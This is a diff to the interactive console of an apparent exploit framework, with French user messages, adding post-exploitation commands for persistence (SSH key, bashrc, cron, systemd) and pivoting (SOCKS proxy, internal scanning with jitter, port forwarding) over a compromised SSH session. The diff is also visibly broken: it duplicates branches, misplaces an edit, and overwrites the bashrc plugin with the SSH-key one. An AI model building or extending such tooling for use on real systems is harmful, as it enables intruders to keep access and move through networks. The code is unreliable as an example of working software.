@@ -63,10 +63,16 @@ class InteractiveConsole:
             await self.spawn_local_shell()
         elif cmd == "generate":
             self.generate_payload(args)
+        elif cmd == "pivot":
+            await self.pivot_command(args)
         elif cmd == "persist":
             await self.persist_command(args)
         elif cmd == "deep_validate":
             await self.deep_validate_command(args)
+        elif cmd == "pivot":
+            await self.pivot_command(args)
+        elif cmd == "persist":
+            await self.persist_command(args)
         elif cmd == "kill":
             self.kill_session(args)
         elif cmd in ("exit", "quit"):
@@ -379,6 +385,9 @@ def launch_interactive_console(framework: ExploitFramework):
             return
         method = args[0]
         if method == "ssh_key":
+            plugin = PersistSSHKey()
+        elif method == "bashrc":
+            plugin = PersistBashrc()
             if len(args) < 3 or args[1] != "--pubkey":
                 console.print("[red]Usage: persist ssh_key --pubkey <fichier_cle_publique>[/]")
                 return
@@ -452,3 +461,113 @@ def launch_interactive_console(framework: ExploitFramework):
                 console.print(f"  {k}: {v}")
         else:
             console.print(f"[red]✗ Secret invalide ou rejeté.[/]")
+
+    async def persist_command(self, args):
+        if not args:
+            console.print("[red]Usage: persist <méthode> [options][/]")
+            console.print("Méthodes disponibles:")
+            console.print("  bashrc --command <commande>")
+            console.print("  ssh_key --pubkey <fichier>")
+            console.print("  cron --command <commande> [--schedule <cron_expr>]")
+            console.print("  systemd --command <commande> [--name <nom_service>]")
+            return
+
+        method = args[0]
+        options = {}
+        # Parser les arguments --key value
+        i = 1
+        while i < len(args):
+            if args[i].startswith('--'):
+                key = args[i][2:]
+                if i + 1 < len(args) and not args[i+1].startswith('--'):
+                    options[key] = args[i+1]
+                    i += 2
+                else:
+                    options[key] = True
+                    i += 1
+            else:
+                i += 1
+
+        sess = self.current_session
+        if not sess or not sess.alive or sess.protocol != "ssh":
+            console.print("[red]Session SSH active requise pour la persistance[/]")
+            return
+
+        from bxp_secretsonar.plugins.post_exploit.persist import PersistSSHKey, PersistCron, PersistSystemd, PersistBashrc
+
+        if method == "ssh_key":
+            plugin = PersistSSHKey()
+        elif method == "bashrc":
+            plugin = PersistBashrc()
+            plugin = PersistSSHKey()
+        elif method == "cron":
+            plugin = PersistCron()
+        elif method == "systemd":
+            plugin = PersistSystemd()
+        else:
+            console.print(f"[red]Méthode de persistance inconnue: {method}[/]")
+            return
+
+        result = plugin.run(sess, options)
+        if result["success"]:
+            console.print("[green]Persistance appliquée avec succès ![/]")
+        else:
+            console.print(f"[red]Échec: {result.get('output', '')} {result.get('error', '')}[/]")
+
+    async def pivot_command(self, args):
+        if not args:
+            console.print("[red]Usage: pivot <méthode> [options][/]")
+            console.print("Méthodes disponibles:")
+            console.print("  list")
+            console.print("  stop all")
+            console.print("  socks [--port <port_local>]")
+            console.print("  scan --range <IP/mask> [--ports <ports>] [--jitter <secondes>]")
+            console.print("  forward --local_port <LPORT> --remote_host <IP> --remote_port <RPORT> [--direction L|R]")
+            return
+
+        method = args[0]
+        options = {}
+        i = 1
+        while i < len(args):
+            if args[i].startswith('--'):
+                key = args[i][2:]
+                if i + 1 < len(args) and not args[i+1].startswith('--'):
+                    options[key] = args[i+1]
+                    i += 2
+                else:
+                    options[key] = True
+                    i += 1
+            else:
+                i += 1
+
+        from bxp_secretsonar.plugins.post_exploit.pivot import PivotSOCKS, PivotScan, PivotPortForward, list_tunnels, stop_all_tunnels
+
+        if method == "list":
+            console.print(list_tunnels())
+            return
+        elif method == "stop":
+            if len(args) > 1 and args[1] == "all":
+                console.print(stop_all_tunnels())
+            else:
+                console.print("[red]Usage: pivot stop all[/]")
+            return
+        elif method == "socks":
+            plugin = PivotSOCKS()
+        elif method == "scan":
+            plugin = PivotScan()
+        elif method == "forward":
+            plugin = PivotPortForward()
+        else:
+            console.print(f"[red]Méthode inconnue: {method}[/]")
+            return
+
+        sess = self.current_session
+        if not sess or not sess.alive or sess.protocol != "ssh":
+            console.print("[red]Session SSH active requise pour le pivoting[/]")
+            return
+
+        result = plugin.run(sess, options)
+        if result["success"]:
+            console.print(f"[green]{result['output']}[/]")
+        else:
+            console.print(f"[red]Échec: {result.get('output', '')}[/]")
